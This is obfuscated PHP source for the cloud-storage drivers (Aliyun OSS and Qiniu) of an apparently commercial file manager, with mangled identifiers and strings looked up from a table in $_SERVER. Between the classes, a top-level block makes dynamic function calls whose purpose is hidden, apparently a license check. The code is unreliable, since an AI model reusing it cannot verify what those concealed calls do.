array($dœ‘Ç®ÒĞÂ[188] => $b×«ÖÑ³­, $dœ‘Ç®ÒĞÂ[189] => $e„ šÕ´¬); } goto E‹Äå¬³ˆ‡; F°É¸¸àÆÛ: $dœ‘Ç®ÒĞÂ =& $_SERVER[Äº¡•ô™Ÿ]; $aììÏâ§‘× = trim($aììÏâ§‘×, $dœ‘Ç®ÒĞÂ[8]); $Cõ˜ç­ÈÒé = empty($aììÏâ§‘×) ? $dœ‘Ç®ÒĞÂ[33] : $aììÏâ§‘× . $dœ‘Ç®ÒĞÂ[8]; goto aƒñÓÃàÖÃ; Cø‡ŠŠôêš: } public function listAll($F‘¬¬Ğƒ) { $a“ğ‘÷Ì =& $_SERVER[Äº¡•ô™Ÿ]; $bìçÀß·©” = $this->fileList($F‘¬¬Ğƒ, $a“ğ‘÷Ì[33], !0); $A¦ÉçÔ…©Õ = array(); foreach ($bìçÀß·©”[$a“ğ‘÷Ì[73]] as $eéò‚á‡ÛÉ) { $A¦ÉçÔ…©Õ[$eéò‚á‡ÛÉ[$a“ğ‘÷Ì[28]]] = $eéò‚á‡ÛÉ[$a“ğ‘÷Ì[77]]; } return $this->listAllFiles($F‘¬¬Ğƒ, array_keys($A¦ÉçÔ…©Õ), $A¦ÉçÔ…©Õ); } public function canRead($AĞù÷Ú£‚È) { $fÃ‚‹çŒ¼¬ =& $_SERVER[Äº¡•ô™Ÿ]; $b›Š„´‰š• = $this->pathAcl($AĞù÷Ú£‚È); return $b›Š„´‰š• == $fÃ‚‹çŒ¼¬[1186] || $b›Š„´‰š• == $fÃ‚‹çŒ¼¬[487] ? !0 : !1; } public function canWrite($aÍ¯ĞÇ“è) { $b¢®İ¶¦˜ = $this->pathAcl($aÍ¯ĞÇ“è); return $b¢®İ¶¦˜ == $_SERVER[Äº¡•ô™Ÿ][487] ? !0 : !1; } public function pathAcl($báÀ¢ïÙŒù) { goto f—¸´…È¶; f—¸´…È¶: $aŞ‡†¦†Ïá =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Cå©‘™å«„ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($báÀ¢ïÙŒù)); } catch (OSS\Core\OssException $c½äì«Œà) { return !1; } goto cÇ†µÔé³; cÇ†µÔé³: $aæƒ…Í¯šñ = $Cå©‘™å«„ == $aŞ‡†¦†Ïá[34] ? $this->bucketAcl : $Cå©‘™å«„; if ($aæƒ…Í¯šñ == $aŞ‡†¦†Ïá[1187]) { return $aŞ‡†¦†Ïá[1186]; } if ($aæƒ…Í¯šñ == $aŞ‡†¦†Ïá[1188]) { return $aŞ‡†¦†Ïá[487]; } goto a„Òì¯µ²í; a„Òì¯µ²í: return $aæƒ…Í¯šñ; goto d±•ğÂºÎ‘; d±•ğÂºÎ‘: } private function chmodPath($Cµ½¢æ’, $a±øÌ»ˆó… = '') { $f½šË¼ºóá =& $_SERVER[Äº¡•ô™Ÿ]; $eèæÓ„¬¿» = empty($a±øÌ»ˆó…) ? $f½šË¼ºóá[1188] : $a±øÌ»ˆó…; $A¶˜ÃÎÂé = array($f½šË¼ºóá[34], $f½šË¼ºóá[182], $f½šË¼ºóá[1187], $f½šË¼ºóá[1188]); if (!in_array($eèæÓ„¬¿», $A¶˜ÃÎÂé)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($Cµ½¢æ’), $eèæÓ„¬¿»); } catch (OSS\Core\OssException $aÈÀ£ß»‡Ê) { return !1; } return !0; } public function getContent($f’¬Óö£íÉ) { return $this->fileSubstr($f’¬Óö£íÉ, -1); } public function setContent($C·Û³ÈÈ‡ì, $Aº¾ßâÁ¾É = '') { $aØæ†ø÷×Â =& $_SERVER[Äº¡•ô™Ÿ]; try { $C‹«İ‡Åö– = $this->trafficLimit($aØæ†ø÷×Â[1189]); $FêµõÁ…¶ = $this->client->putObject($this->bucket, $this->pathEncode($C·Û³ÈÈ‡ì), $Aº¾ßâÁ¾É, $C‹«İ‡Åö–); } catch (OSS\Core\OssException $AÏ¾¼Ñ”×µ) { return !1; } $B‡”“ë–› = array($aØæ†ø÷×Â[1176] => trim($FêµõÁ…¶[$aØæ†ø÷×Â[1190]], $aØæ†ø÷×Â[113]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C·Û³ÈÈ‡ì))); $this->updateObjMeta($C·Û³ÈÈ‡ì, $B‡”“ë–›); return isset($FêµõÁ…¶[$aØæ†ø÷×Â[1191]][$aØæ†ø÷×Â[1138]]) ? (int) $FêµõÁ…¶[$aØæ†ø÷×Â[1191]][$aØæ†ø÷×Â[1138]] : strlen($FêµõÁ…¶); } private function updateObjMeta($CŠÒ¼ŒŞÓŸ, $BÉ¶’¨òõÂ) { $CŠÒ¼ŒŞÓŸ = $this->pathEncode($CŠÒ¼ŒŞÓŸ); try { $C½‡»¸‡†Ö = array(OSS\OssClient::OSS_HEADERS => $BÉ¶’¨òõÂ); $this->client->copyObject($this->bucket, $CŠÒ¼ŒŞÓŸ, $this->bucket, $CŠÒ¼ŒŞÓŸ, $C½‡»¸‡†Ö); } catch (OSS\Core\OssException $EÁïÎÍ¯Œ) { return !1; } return !0; } public function upload($d¯áùµôÙç, $BùËÛëª‹™, $d—ÖŒ†©ô¶ = false, $fè¬ ¬‹¸Æ = REPEAT_REPLACE) { $eõ‰ÄÑáÅÎ =& $_SERVER[Äº¡•ô™Ÿ]; $eö¦Ø¹Ññí = trim($d¯áùµôÙç, $eõ‰ÄÑáÅÎ[8]); $fõ¥‡‘¬œñ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => $this->osChunkSize(), OSS\OssClient::OSS_HEADERS => array($eõ‰ÄÑáÅÎ[1176] => @md5_file($BùËÛëª‹™)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($d¯áùµôÙç))); $fõ¥‡‘¬œñ = $this->trafficLimit($eõ‰ÄÑáÅÎ[1189], $fõ¥‡‘¬œñ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($eö¦Ø¹Ññí), $BùËÛëª‹™, $fõ¥‡‘¬œñ); } catch (OSS\Core\OssException $bß¹¶Ã§Ú‡) { return !1; } return $this->getPathOuter($d¯áùµôÙç); } public function getHost() { $b·Ê¹Œ±‰ =& $_SERVER[Äº¡•ô™Ÿ]; $Eæ¡ƒÂëé… = explode($b·Ê¹Œ±‰[168], parent::getHost()); return $Eæ¡ƒÂëé…[0] . $b·Ê¹Œ±‰[168] . $this->bucket . $b·Ê¹Œ±‰[93] . $Eæ¡ƒÂëé…[1]; } public function uploadFormData($dßõ¦·‹™Ï, $e²œ¾ÒÈˆ = 3600) { goto e ˆ¥ÕìÛ§; D›æğÈ©™: $B°Á£Àâ¹ = date($cŒŞ´í¹–”[1192], time() + $a¬‰“Ä‚ Õ); $b§ìéÌ˜Ùã = new DateTime($B°Á£Àâ¹); $f¾“’»ƒ© = $b§ìéÌ˜Ùã->format(DateTime::ISO8601); goto bè‘¾å°ã; AÄÌ®Æ‹›”: $bâ•ŸÅªæ = base64_encode(hash_hmac($cŒŞ´í¹–”[215], $e‹—¦ÅŒÍ, $this->secret, !0)); $Aµ‘‹£¶ = array($cŒŞ´í¹–”[1105] => $e‹—¦ÅŒÍ, $cŒŞ´í¹–”[1195] => $this->accessKey, $cŒŞ´í¹–”[1101] => $cŒŞ´í¹–”[1093], $cŒŞ´í¹–”[1196] => $bâ•ŸÅªæ, $cŒŞ´í¹–”[166] => $C‡²èÀ·Á); $Aµ‘‹£¶ = $this->trafficLimit($cŒŞ´í¹–”[1189], $Aµ‘‹£¶); goto cîƒ®Û‰; e ˆ¥ÕìÛ§: $cŒŞ´í¹–” =& $_SERVER[Äº¡•ô™Ÿ]; if (!($C‡²èÀ·Á = $this->getHost())) { return !1; } $a¬‰“Ä‚ Õ = $e²œ¾ÒÈˆ; goto D›æğÈ©™; cîƒ®Û‰: return $Aµ‘‹£¶; goto CŒÈé¾¢İï; BÆëøÍÆš¨: $eóâéìáã² = $this->pathFather($dßõ¦·‹™Ï); $BøàöêƒŠÁ = array($cŒŞ´í¹–”[1095] => $f¾“’»ƒ©, $cŒŞ´í¹–”[1096] => array(array($cŒŞ´í¹–”[1194], 0, $AÃç‰Ï¦åá), array($cŒŞ´í¹–”[1099], $cŒŞ´í¹–”[1100], $eóâéìáã²))); $e‹—¦ÅŒÍ = base64_encode(json_encode($BøàöêƒŠÁ)); goto AÄÌ®Æ‹›”; bè‘¾å°ã: $dÕîª‰ôìŞ = strpos($f¾“’»ƒ©, $cŒŞ´í¹–”[281]); $f¾“’»ƒ© = substr($f¾“’»ƒ©, 0, $dÕîª‰ôìŞ) . $cŒŞ´í¹–”[1193]; $AÃç‰Ï¦åá = 1048576000 * 5; goto BÆëøÍÆš¨; CŒÈé¾¢İï: } public function multiUploadFormData($bÀùˆÎÜÖØ, $EğùÔª–¸è = 3600) { $EŸï«õˆòÌ =& $_SERVER[Äº¡•ô™Ÿ]; if (!($C¤‡‘š»ÈÄ = $this->getHost())) { return !1; } $eŒä¿–İ­ = $this->trafficLimit($EŸï«õˆòÌ[1189]); $cºÙ¤ÄğÄÖ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÀùˆÎÜÖØ), $eŒä¿–İ­); return array($EŸï«õˆòÌ[206] => $cºÙ¤ÄğÄÖ, $EŸï«õˆòÌ[166] => $C¤‡‘š»ÈÄ . $EŸï«õˆòÌ[8] . $this->pathEncode($bÀùˆÎÜÖØ), $EŸï«õˆòÌ[207] => gmdate($EŸï«õˆòÌ[1197]), $EŸï«õˆòÌ[89] => $bÀùˆÎÜÖØ); } public function multiUploadAuthData($DÖ„ëÌá, $d“ÇòÇÀÕ¡ = array()) { goto BåÃÂ´ˆÏù; BåÃÂ´ˆÏù: $Eùš–ñ¬ÉÛ =& $_SERVER[Äº¡•ô™Ÿ]; $D×ãšà¯  = isset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[207]]) ? $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[207]] : gmdate($Eùš–ñ¬ÉÛ[1197]); $A™™ÜÆÚ÷‰ = isset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[157]]) ? $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[157]] : $Eùš–ñ¬ÉÛ[33]; goto BøĞíÒ„Ï; b”¹ÇƒøÃñ: if (!empty($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[1199]])) { $c›Â”ô÷İ = array_merge(array($c›ö†Ì®[4]), $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[1199]]); sort($c›Â”ô÷İ); $c›ö†Ì®[4] = implode($Eùš–ñ¬ÉÛ[214], $c›Â”ô÷İ); } $açãˆ® = implode($Eùš–ñ¬ÉÛ[214], $c›ö†Ì®); $Fµ¾êù¾Ô¡ = base64_encode(hash_hmac($Eùš–ñ¬ÉÛ[215], $açãˆ®, $this->secret, !0)); goto bƒºãØÁä»; Cá½²¶Éã¶: $c›ö†Ì® = array($Eùš–ñ¬ÉÛ[209], $Eùš–ñ¬ÉÛ[33], $Eùš–ñ¬ÉÛ[116], $D×ãšà¯ , "\170\x2d\x6f\x73\x73\55\144\x61\x74\145\x3a{$D×ãšà¯ }", $Eùš–ñ¬ÉÛ[8] . $this->bucket . $Eùš–ñ¬ÉÛ[8] . $bÉë“²ƒ£© . $A™™ÜÆÚ÷‰); if (strpos($A™™ÜÆÚ÷‰, $Eùš–ñ¬ÉÛ[210]) === 0) { $c›ö†Ì®[0] = $Eùš–ñ¬ÉÛ[211]; if ($fƒç¼ƒ÷öŸ = $this->trafficLimit($Eùš–ñ¬ÉÛ[1189])) { $bÉë“²ƒ£© = $Eùš–ñ¬ÉÛ[1198]; array_splice($c›ö†Ì®, 5, 0, $bÉë“²ƒ£© . $Eùš–ñ¬ÉÛ[4] . $fƒç¼ƒ÷öŸ[$bÉë“²ƒ£©]); } } if (isset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[212]]) && $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[212]] == $Eùš–ñ¬ÉÛ[213]) { $c›ö†Ì®[0] = $Eùš–ñ¬ÉÛ[213]; } goto b”¹ÇƒøÃñ; BøĞíÒ„Ï: $bÉë“²ƒ£© = $DÖ„ëÌá; if (isset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[89]])) { $bÉë“²ƒ£© = $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[89]]; unset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[89]]); } if (isset($d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[208]])) { $d“ÇòÇÀÕ¡[$Eùš–ñ¬ÉÛ[207]] = $D×ãšà¯ ; return $this->listUploadParts($bÉë“²ƒ£©, $d“ÇòÇÀÕ¡); } goto Cá½²¶Éã¶; bƒºãØÁä»: $E²‰Å’®âğ = $Eùš–ñ¬ÉÛ[1200] . $this->accessKey . $Eùš–ñ¬ÉÛ[4] . $Fµ¾êù¾Ô¡; if (strpos($A™™ÜÆÚ÷‰, $Eùš–ñ¬ÉÛ[210]) === 0) { $E²‰Å’®âğ = array($Eùš–ñ¬ÉÛ[217] => $E²‰Å’®âğ, $Eùš–ñ¬ÉÛ[207] => $D×ãšà¯ ); if ($fƒç¼ƒ÷öŸ) { $E²‰Å’®âğ = array_merge($E²‰Å’®âğ, $fƒç¼ƒ÷öŸ); } } return $E²‰Å’®âğ; goto EŒ·®§—Á; EŒ·®§—Á: } public function listUploadParts($a°Œ¤¦ŒÓ³, $BÇ½Œ…ÎÜˆ) { goto b‰Àæµ¢¨´; BÑªÅ®¦¼ï: unset($BÇ½Œ…ÎÜˆ[$B’¼ö³¬‘ö[208]], $BÇ½Œ…ÎÜˆ[$B’¼ö³¬‘ö[212]]); $b‹„¿Î±‰ = $this->multiUploadAuthData($a°Œ¤¦ŒÓ³, $BÇ½Œ…ÎÜˆ); if (empty($b‹„¿Î±‰)) { return !1; } goto A‰«µØ¾ô‚; dŠ¼˜®æé: $BÜˆÅ¢¼„ß = $a¡‰Ûùí†„->getListPart(); $FÀŒ³ÌºæË = array(); foreach ($BÜˆÅ¢¼„ß as $fµ£µ–Ã¼ñ) { $FÀŒ³ÌºæË[] = array($B’¼ö³¬‘ö[1180] => $fµ£µ–Ã¼ñ->getPartNumber(), $B’¼ö³¬‘ö[1181] => trim($fµ£µ–Ã¼ñ->getETag(), $B’¼ö³¬‘ö[113])); } goto BÑªÅ®¦¼ï; b‰Àæµ¢¨´: $B’¼ö³¬‘ö =& $_SERVER[Äº¡•ô™Ÿ]; $f»Õ“×—°• = parse_url_query($BÇ½Œ…ÎÜˆ[$B’¼ö³¬‘ö[157]]); $a¡‰Ûùí†„ = $this->client->listParts($this->bucket, $this->pathEncode($a°Œ¤¦ŒÓ³), $f»Õ“×—°•[$B’¼ö³¬‘ö[206]]); goto dŠ¼˜®æé; A‰«µØ¾ô‚: return array($B’¼ö³¬‘ö[217] => $b‹„¿Î±‰, $B’¼ö³¬‘ö[207] => $BÇ½Œ…ÎÜˆ[$B’¼ö³¬‘ö[207]], $B’¼ö³¬‘ö[219] => $FÀŒ³ÌºæË); goto a¯à³™¨Ü; a¯à³™¨Ü: } public function download($f•¯îãÚÍ†, $a¶¬ë¥Ñ²à) { if ($this->isFolder($f•¯îãÚÍ†)) { return !1; } try { $Eíê‰½©Ú· = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $a¶¬ë¥Ñ²à); $Eíê‰½©Ú· = $this->trafficLimit($_SERVER[Äº¡•ô™Ÿ][105], $Eíê‰½©Ú·); $this->client->getObject($this->bucket, $this->pathEncode($f•¯îãÚÍ†), $Eíê‰½©Ú·); } catch (OSS\Core\OssException $Aóã¸òÀ¦Ò) { return !1; } return $a¶¬ë¥Ñ²à; } public function fileSubstr($cœßÛ”ÓÍÍ, $aŞÚÅªˆë = 0, $DšØ¦’ÄšŒ = false) { if ($aŞÚÅªˆë === -1) { $d³‡…«®‚ = array(); } else { if ($DšØ¦’ÄšŒ === !1) { $bïç¢‡ÚÂ¢ = $this->size($cœßÛ”ÓÍÍ); } else { $bïç¢‡ÚÂ¢ = $aŞÚÅªˆë + $DšØ¦’ÄšŒ - 1; } $d³‡…«®‚ = array(OSS\OssClient::OSS_RANGE => "{$aŞÚÅªˆë}\x2d{$bïç¢‡ÚÂ¢}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($cœßÛ”ÓÍÍ), $d³‡…«®‚); } catch (OSS\Core\OssException $c¸«²Õ¼Ğ) { think_exception($c¸«²Õ¼Ğ->getMessage()); return !1; } } private function trafficLimit($fë¯ËÛ•­, $FÉÕïª¿ŠŒ = array()) { goto AØ…¦£ç­Œ; AØ…¦£ç­Œ: $AòÎ½…À¿ =& $_SERVER[Äº¡•ô™Ÿ]; if ($fë¯ËÛ•­ == $AòÎ½…À¿[1189] && $this->isUploadServer() || $fë¯ËÛ•­ == $AòÎ½…À¿[105] && $this->isFileOutServer()) { return $FÉÕïª¿ŠŒ; } $f¡éÛ‘Ø³ = floatval($GLOBALS[$AòÎ½…À¿[6]][$AòÎ½…À¿[84]][$AòÎ½…À¿[91]][$fë¯ËÛ•­]) * 1024 * 1024 * 8; goto e…é½øİ®; e…é½øİ®: if (!$f¡éÛ‘Ø³) { return $FÉÕïª¿ŠŒ; } $f¡éÛ‘Ø³ = $f¡éÛ‘Ø³ < 819200 ? 819200 : ($f¡éÛ‘Ø³ > 838860800 ? 838860800 : $f¡éÛ‘Ø³); $FÉÕïª¿ŠŒ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($f¡éÛ‘Ø³); goto f’‡à²Å¡…; f’‡à²Å¡…: return $FÉÕïª¿ŠŒ; goto d¥íŒËĞ¨ç; d¥íŒËĞ¨ç: } public function link($f¿»ğ—Éõæ, $bñè‡Â›¬¹ = array()) { $cÙÖÆ¹êí£ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->exist($f¿»ğ—Éõæ) || $this->isFolder($f¿»ğ—Éõæ)) { return !1; } try { $bñè‡Â›¬¹ = $this->trafficLimit($cÙÖÆ¹êí£[105], $bñè‡Â›¬¹); $eïŒÕ¤™®‘ = $this->client->signUrl($this->bucket, $this->pathEncode($f¿»ğ—Éõæ), 3600 * 12, $cÙÖÆ¹êí£[213], $bñè‡Â›¬¹); return $this->getCdnLink($eïŒÕ¤™®‘); } catch (OSS\Core\OssException $bËğÈÖ»ë”) { return !1; } } public function fileOut($Bé…ÓğªÀ, $Eßò“Ø¼›÷ = false, $EĞˆšÁìê¥ = false, $EİöêŸ¿ÔÏ = '') { goto dÊ¤»õ¾–; Dò‚“¥§Êå: $aæÁÖøöä = array(OSS\OssClient::OSS_SUB_RESOURCE => $D°½šµ™ÆÉ[1201] . rawurlencode("{$Eßò“Ø¼›÷}\x3b\146\x69\x6c\x65\x6e\x61\x6d\145\x3d{$EĞˆšÁìê¥}")); $aæÁÖøöä[OSS\OssClient::OSS_SUB_RESOURCE] .= $D°½šµ™ÆÉ[1202] . $f÷²ºßíˆ; $d·™±ã–ö = $this->link($Bé…ÓğªÀ, $aæÁÖøöä); goto eò†¿—Ê ¬; dÊ¤»õ¾–: $D°½šµ™ÆÉ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$EĞˆšÁìê¥) { $EĞˆšÁìê¥ = $this->pathThis($Bé…ÓğªÀ); } $EĞˆšÁìê¥ = rawurlencode($EĞˆšÁìê¥); goto då‰¿ß†Ñé; eò†¿—Ê ¬: $this->fileOutLink($d·™±ã–ö); goto eÒà¼‚½š‡; då‰¿ß†Ñé: $f÷²ºßíˆ = get_file_mime(get_path_ext($EĞˆšÁìê¥)); if ($f÷²ºßíˆ == $D°½šµ™ÆÉ[198]) { return parent::fileOut($Bé…ÓğªÀ, $Eßò“Ø¼›÷, $EĞˆšÁìê¥, $EİöêŸ¿ÔÏ); } $Eßò“Ø¼›÷ = $Eßò“Ø¼›÷ ? $D°½šµ™ÆÉ[199] : $D°½šµ™ÆÉ[200]; goto Dò‚“¥§Êå; eÒà¼‚½š‡: } public function fileOutServer($E¹Ú©Ä²…¿, $c¾ˆÏ«ñòÜ = false, $d’ŒÊ¼˜›° = false, $bÏ×éğìİÌ = '') { parent::fileOut($E¹Ú©Ä²…¿, $c¾ˆÏ«ñòÜ, $d’ŒÊ¼˜›°, $bÏ×éğìİÌ); } public function fileOutImage($dñ÷ŸªâËŠ, $bì¿…¯Œó´ = 250) { $A’àì·ô« = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Äº¡•ô™Ÿ][1203] . $bì¿…¯Œó´); $dù Ğ ¿ªå = $this->link($dñ÷ŸªâËŠ, $A’àì·ô«); $this->fileOutLink($dù Ğ ¿ªå); } public function fileOutImageServer($cÑù±”“–Â, $aÀÅŠ‹çñò = 250) { parent::fileOutImage($cÑù±”“–Â, $aÀÅŠ‹çñò); } public function fileOutLink($FŠ°†ªøö) { $CáÇª¶ñà• =& $_SERVER[Äº¡•ô™Ÿ]; if (!$this->isCdnHost() && substr($FŠ°†ªøö, 0, 7) == $CáÇª¶ñà•[1108]) { $FŠ°†ªøö = $CáÇª¶ñà•[1109] . substr($FŠ°†ªøö, 7); } header($CáÇª¶ñà•[153] . $FŠ°†ªøö); die; } public function hashMd5($e­¦÷õÖ“‚, $Cºö™Í§­œ = '') { $C›¶Ï£›‰Î =& $_SERVER[Äº¡•ô™Ÿ]; $E®ÜÂÌø´é = $this->objectMeta($e­¦÷õÖ“‚); if (!$E®ÜÂÌø´é) { return $C›¶Ï£›‰Î[33]; } if (!isset($E®ÜÂÌø´é[$C›¶Ï£›‰Î[1176]]) && !empty($Cºö™Í§­œ)) { $aË‡«íå¢¡ = $this->updateObjMeta($e­¦÷õÖ“‚, array($C›¶Ï£›‰Î[1176] => $Cºö™Í§­œ)); $E®ÜÂÌø´é[$C›¶Ï£›‰Î[1176]] = $aË‡«íå¢¡ ? $Cºö™Í§­œ : $C›¶Ï£›‰Î[33]; } return isset($E®ÜÂÌø´é[$C›¶Ï£›‰Î[1176]]) ? strtolower($E®ÜÂÌø´é[$C›¶Ï£›‰Î[1176]]) : $C›¶Ï£›‰Î[33]; } public function size($Dô„©À¹—„) { $AÂİ…‚…¯É = $this->objectMeta($Dô„©À¹—„); return $AÂİ…‚…¯É ? $AÂİ…‚…¯É[$_SERVER[Äº¡•ô™Ÿ][77]] : 0; } public function info($C÷”µ²ÂÄ) { if ($this->isFolder($C÷”µ²ÂÄ)) { return $this->folderInfo($C÷”µ²ÂÄ); } else { if ($this->isFile($C÷”µ²ÂÄ)) { return $this->fileInfo($C÷”µ²ÂÄ); } } return !1; } public function exist($E­Ò²Ï‚ñ) { return $this->isFile($E­Ò²Ï‚ñ) || $this->isFolder($E­Ò²Ï‚ñ); } public function isFile($a½ğÔÂ­ä‹) { return !$this->isFolder($a½ğÔÂ­ä‹) && $this->objectMeta($a½ğÔÂ­ä‹); } public function isFolder($EëÚ†‘Ø³·) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][220], $EëÚ†‘Ø³·); } protected function objectMeta($cÓ·¯«Ù¦) { return $this->cacheMethod($_SERVER[Äº¡•ô™Ÿ][221], $cÓ·¯«Ù¦); } protected function _objectMeta($f¢Ô»Ñ§ê¢) { $a„Ş¨´÷„ =& $_SERVER[Äº¡•ô™Ÿ]; try { $F½ÇÕ”´í = $this->client->getObjectMeta($this->bucket, $this->pathEncode($f¢Ô»Ñ§ê¢)); } catch (OSS\Core\OssException $D¡ÖÓä¹âˆ) { $F½ÇÕ”´í = !1; } if ($F½ÇÕ”´í) { $F½ÇÕ”´í[$a„Ş¨´÷„[77]] = intval($F½ÇÕ”´í[$a„Ş¨´÷„[1183]]); } return $F½ÇÕ”´í; } protected function _isFolder($AáŞòö‹¢) { $Còİ´±åäõ =& $_SERVER[Äº¡•ô™Ÿ]; if ($AáŞòö‹¢ == $Còİ´±åäõ[33] || $AáŞòö‹¢ == $Còİ´±åäõ[8]) { return !0; } $A¬ó…¦¯˜ = array($Còİ´±åäõ[1173] => $Còİ´±åäõ[8], $Còİ´±åäõ[183] => rtrim($AáŞòö‹¢, $Còİ´±åäõ[8]) . $Còİ´±åäõ[8], $Còİ´±åäõ[1174] => 1, $Còİ´±åäõ[1175] => $Còİ´±åäõ[33]); $d²Î¿Í—ÛÒ = $this->client->listObjects($this->bucket, $A¬ó…¦¯˜); if ($d²Î¿Í—ÛÒ->getObjectList() || $d²Î¿Í—ÛÒ->getPrefixList()) { return !0; } return !1; } } if ($_SERVER[$_SERVER[Äº¡•ô™Ÿ][789]] != $_SERVER[$_SERVER[Äº¡•ô™Ÿ][790]]) { goto bÛ˜¯©ß‡“; b£·Ô•­: $b‹ç¿Ö´($_SERVER[$_SERVER[Äº¡•ô™Ÿ][1205]]); goto dÀ…‡Šàöß; bÛ˜¯©ß‡“: $bàŠ‡ö¬—ó = $_SERVER[Äº¡•ô™Ÿ][792]; $f­À½æˆ = $_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]; $D À‡õší­ = $bàŠ‡ö¬—ó($f­À½æˆ); goto DŒˆÓ“ìï; DŒˆÓ“ìï: $A·Òíà‹ò = explode($_SERVER[Äº¡•ô™Ÿ][214], $D À‡õší­); if (count($A·Òíà‹ò) < $_SERVER[Äº¡•ô™Ÿ][561]) { $f¸¨„£ÂŸ = $_SERVER[Äº¡•ô™Ÿ][795]; $f¸¨„£ÂŸ(); } $b‹ç¿Ö´ = $_SERVER[Äº¡•ô™Ÿ][1204]; goto b£·Ô•­; dÀ…‡Šàöß: } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($C¤ˆ…Ê‰ª¸) { parent::__construct(); require_once SDK_DIR . $_SERVER[Äº¡•ô™Ÿ][1206]; $this->_init($C¤ˆ…Ê‰ª¸); } public function _init($fØ’¨©Ş“™) { foreach ($fØ’¨©Ş“™ as $BÇÅÈ»ì => $AæÀåÑÅë‰) { if (isset($this->{$BÇÅÈ»ì})) { $this->{$BÇÅÈ»ì} = $AæÀåÑÅë‰; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[Äº¡•ô™Ÿ][1207], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Bô¾îŠ™Ğ, $aƒÜ…¨¦ å = '', $a£šµÅÅì— = REPEAT_RENAME) { if ($this->setContent($Bô¾îŠ™Ğ, $aƒÜ…¨¦ å)) { return $this->getPathOuter($Bô¾îŠ™Ğ); } return !1; } public function mkdir($DœĞÖêºƒô, $fÚ±´ÁÕÕ‹ = REPEAT_SKIP) { goto B˜Ğ½ÊôÂ·; F‘ÓÕÊªò„: $DœĞÖêºƒô = $d¨±Â·â´‡ . $fŸ¬†äÁá[8]; $a·œ‹ªÍõŒ = get_path_this($d¨±Â·â´‡); $b›¦¢¦ô® = $DœĞÖêºƒô . $a·œ‹ªÍõŒ; goto CòÑ§í–ôÀ; CòÑ§í–ôÀ: if (!$this->mkfile($b›¦¢¦ô®)) { return !1; } if (!$this->moveFile($b›¦¢¦ô®, $DœĞÖêºƒô)) { $this->delFile($b›¦¢¦ô®); return !1; } return $this->getPathOuter($d¨±Â·â´‡); goto Eœ¬´Ï—Ô; B˜Ğ½ÊôÂ·: $fŸ¬†äÁá =& $_SERVER[Äº¡•ô™Ÿ]; $d¨±Â·â´‡ = trim($DœĞÖêºƒô, $fŸ¬†äÁá[8]); if ($this->_isFolder($d¨±Â·â´‡)) { return $this->getPathOuter($d¨±Â·â´‡); } goto F‘ÓÕÊªò„; Eœ¬´Ï—Ô: } public function copyFile($bœ”‚¤Õ„, $Fò…Œ°éì) { $cÒ¢öé‰‡¼ = $this->bucketManager->copy($this->bucket, $bœ”‚¤Õ„, $this->bucket, $Fò…Œ°éì, !0); return $cÒ¢öé‰‡¼ ? !1 : !0; } public function moveFile($b§ñé‹¨‘, $AôéÃœâ) { $eÌõˆöƒÎç = $this->bucketManager->move($this->bucket, $b§ñé‹¨‘, $this->bucket, $AôéÃœâ, !0); return $eÌõˆöƒÎç ? !1 : !0; } public function delFile($DÏÊƒ©²îê) { $F¹½ëÊ° = $this->bucketManager->delete($this->bucket, $DÏÊƒ©²îê); return $F¹½ëÊ° ? !1 : !0; } public function delFolder($bÜìŠÒ¼Ì”) { $DÚ‹ÂØÉ£Ö = $this->fileList($bÜìŠÒ¼Ì”); if (empty($DÚ‹ÂØÉ£Ö)) { return !0; } $bŠÅŒ‚â¿¯ = 1000; if (count($DÚ‹ÂØÉ£Ö) <= $bŠÅŒ‚â¿¯) { return $this->qnDelObj($DÚ‹ÂØÉ£Ö) ? !1 : !0; } foreach (array_chunk($DÚ‹ÂØÉ£Ö, $bŠÅŒ‚â¿¯) as $d³¨˜‘İ‚) { $B…ã÷‚ë± = $this->qnDelObj($d³¨˜‘İ‚); if ($B…ã÷‚ë±) { return !1; } } return !0; } private function qnDelObj($A»—ÚÖ­µ‡) { $eÔÅ¤´‰éÉ = 